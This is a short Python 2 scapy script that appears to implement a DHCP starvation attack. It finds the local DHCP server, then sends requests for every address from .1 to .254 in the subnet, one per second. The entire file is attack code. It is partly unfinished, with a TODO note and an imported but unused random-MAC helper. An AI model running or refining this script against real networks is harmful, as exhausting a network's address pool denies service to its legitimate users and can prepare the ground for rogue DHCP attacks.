__author__ = 'Yuxibro'
import logging
import socket
import time
logging.getLogger("scapy").setLevel(1)
from scapy.all import conf,sendp,srp1,ICMP,sniff,Ether,IP,ARP,UDP,BOOTP,DHCP,get_if_raw_hwaddr,random,send,RandMAC

conf.checkIPaddr = False
fam,hw = get_if_raw_hwaddr(conf.iface)

myIPv4Address = socket.gethostbyname(socket.gethostname())
splittedIPv4 = myIPv4Address.split(".")               # get current IPV4 and split it into array
print "Our IPV4 address: ",myIPv4Address      #rejoin the string for printing


# takes an splitted IPv4 address array and assemble it back to standard IPv4 address with "."
def reassembleIPAddress(splittedIPArrary):
    resultString = ""
    for index in range(len(splittedIPArrary)):
        if index < len(splittedIPArrary)-1:
            resultString+=splittedIPArrary[index]+"."
        else:
            resultString+=splittedIPArrary[index]
    return resultString

LegitDHCPServer = {'MAC':"",'IP':"",'suggestedIP':""} # using dictionary to store server info

# Find out who the DHCP server is. And prepare to send Request later
def dhcp_discover(pkt):
    global LegitDHCPServer
    for opt in pkt[DHCP].options:
        if LegitDHCPServer['MAC'] == "" and opt[0] == "message-type" and opt[1] == 2:
            print "Init: "
            LegitDHCPServer['MAC'] = pkt[Ether].src
            LegitDHCPServer['IP'] = pkt[IP].src
            LegitDHCPServer['suggestedIP'] = pkt[BOOTP].yiaddr
            print "DHCPServer: ",LegitDHCPServer
        elif opt == 'end':
            break
        elif opt == 'pad':
            break

# Server need to respond to "Discover" & "Request" msg
def dhcp_sendRequest(requestIP):
    print requestIP
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(op=1,chaddr=hw)/
          DHCP(options=[("server_id",LegitDHCPServer['IP']),("message-type","request"),("requested_addr",requestIP),('end')]))

# Send discover msg to discover who the server is
sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(op=1,chaddr=hw)/DHCP(options=[("message-type","discover")]),count=1)

# Sniff Discover Msg, to find the legit dhcp server
sniff(filter="udp and (port 67 or 68)", prn=dhcp_discover, store=0,count=1)
for index in range(1, 255):
    print "We're on index",(index)
    requestIPArray = splittedIPv4
    requestIPArray[3] = str(index)
    requestIP = reassembleIPAddress(requestIPArray)
    dhcp_sendRequest(requestIP)         # call function that send request with the index
    time.sleep(1)
# TODO: Send request to the server once discovered who the DHCP server is

#sniff(iface="en0",filter="udp and (port 67 or 68)", prn=dhcp_request, store=0)
